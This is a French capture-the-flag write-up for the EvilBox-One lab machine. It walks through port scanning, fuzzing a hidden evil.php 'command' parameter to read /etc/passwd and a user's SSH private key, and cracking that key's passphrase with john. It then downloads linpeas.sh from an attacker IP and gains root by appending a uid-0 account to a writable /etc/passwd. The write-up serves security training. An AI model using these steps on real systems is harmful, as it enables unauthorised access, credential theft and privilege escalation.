# EvilBox-One

    sudo nmap -A -p1-10000 192.168.161.212
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.161.212 -e tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.161.212
    feroxbuster -u http://192.168.161.212

Scans classiques. 

Quasiment rien d'intéressant à part un dossier /secret que j'ai décidé d'énumérer également :

    ffuf -u http://192.168.161.212/secret/FUZZ -w  /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -e .php,.php5,.txt,.ini,.conf,.log,.html,.js,.bak,.aspx,.asp -fc 403

On voit qu'il contient un fichier **"evil.php"** mais ce dernier est complètement vide aussi. J'ai bloqué pendant un moment avant de voir, grâce à un indice, qu'il fallait également faire du fuzzing sur les paramètres de l'URL. Cela peut se déduire par élimination. Et il faut bien penser à essayer avec différents types de paramètres pour brosser un maximum de possibilités : du texte, des chiffres, un nom de fichier, etc.

    ffuf  -u http://192.168.161.212/secret/evil.php?FUZZ=aaaaa -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -fs 0
    ffuf  -u http://192.168.161.212/secret/evil.php?FUZZ=12345 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -fs 0
    ...
    ffuf  -u http://192.168.161.212/secret/evil.php?FUZZ=/etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -fs 0

Les premières commandes ne donnent rien mais dans la dernière il y a un paramètre **"command"** qui nous sort une page web de taille supérieure à 0. Et en effet, en allant sur la page http://192.168.161.212/secret/evil.php?command=/etc/passwd on voit un contenu de fichier /etc/passwd affiché à l'écran.

En cherchant des utilisateurs qui ont un shell différent de **"/usr/sbin/nologin"** on voit un **"mowree"** et comme le paramètre ne marche pas avec les dossiers je me suis orienté vers la clé SSH. 

En visitant http://192.168.161.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa on tombe bien sur la clé de cet utilisateur. Quand on essaye de se connecter en SSH, un mot de passe est demandé. La seule chose à faire est donc de tenter de casser la passphrase en espérant qu'elle soit assez faible. Et c'est le cas : 

    curl http://192.168.161.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa -o  id_rsa
    ssh2john id_rsa > mowree.txt
    john mowree.txt

Attention à bien passer par la ligne de commande pour éviter les problèmes de format pour les clés.
Connexion au serveur avec la passphrase fraîchement obtenue : 

    chmod 600 id_rsa
    ssh  -l mowree -i  id_rsa 192.168.161.212
    cat local.txt

### Élévation de privilèges : 

LinPEAS a trouvé que le fichier /etc/passwd était accessible en écriture et je peux donc me rajouter comme utilisateur :

    wget http://192.168.45.199/linpeas.sh
    chmod u+x linpeas.sh  
    ./linpeas.sh | tee linpeas.txt
    less -R linpeas.txt
	...
	openssl passwd -1 mdp123
    echo 'tim:$1$32DcXeSt$KWQS4pZ0.TchxHMtQoYCM0:0:0:/root/:/bin/bash' >> /etc/passwd
    su tim
    ls /root
    cat /root/proof.txt
